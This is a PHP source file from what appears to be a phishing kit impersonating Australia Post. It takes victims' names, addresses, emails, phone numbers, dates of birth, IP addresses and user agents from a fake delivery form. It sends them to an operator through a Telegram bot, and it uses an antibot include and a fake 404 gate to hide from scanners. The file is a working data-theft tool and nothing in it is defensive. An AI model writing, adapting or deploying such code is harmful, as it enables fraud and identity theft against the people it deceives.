<?php

//   _____         _ __      __     
//  / ____|  /\   | |\ \    / /\    
// | (___   /  \  | | \ \  / /  \   
//  \___ \ / /\ \ | |  \ \/ / /\ \  
//  ____) / ____ \| |___\  / ____ \ 
// |_____/_/    \_\______\/_/    \_\

session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';

// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}

$_SESSION['STEP_CHAIN'] = 3; // INFO COLLECTED

function clean($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

$_SESSION['type']     = clean($_POST['type'] ?? '');
$_SESSION['day']      = clean($_POST['day'] ?? '');
$_SESSION['timeslot'] = clean($_POST['timeslot'] ?? '');
$_SESSION['delivery'] = clean($_POST['delivery'] ?? '');
$_SESSION['nom']      = clean($_POST['nom'] ?? '');
$_SESSION['prenom']   = clean($_POST['prenom'] ?? '');
$_SESSION['adresse']  = clean($_POST['adresse'] ?? '');
$_SESSION['zip']      = clean($_POST['zip'] ?? '');
$_SESSION['email']    = clean($_POST['email'] ?? '');
$_SESSION['ville']    = clean($_POST['ville'] ?? '');
$_SESSION['dob']      = clean($_POST['dob'] ?? '');
$_SESSION['tel']      = clean($_POST['tel'] ?? '');

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$os = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$fullName = $_SESSION['prenom'] . ' ' . $_SESSION['nom'];

$message = <<<TEXT
🇦🇺 <b>📦 AUSTRALIA POST – New Delivery Info</b>

<b>Personal Details</b>
├ 👤 Name: <code>$fullName</code>
├ 🏠 Address: <code>{$_SESSION['adresse']}</code>
├ 📍 Postcode / Suburb: <code>{$_SESSION['zip']} {$_SESSION['ville']}</code>
├ 📞 Mobile: <code>{$_SESSION['tel']}</code>
├ 📧 Email: <code>{$_SESSION['email']}</code>
└ 🎂 DOB: <code>{$_SESSION['dob']}</code>

<b>Device Info</b>
├ 🌐 IP: <code>$ip</code>
└ 🌐 UA: <i>$os</i>
TEXT;

sendTelegramMessage($bot_token, $chat_id, $message);

header('Location: ../process.php'); exit();
?>
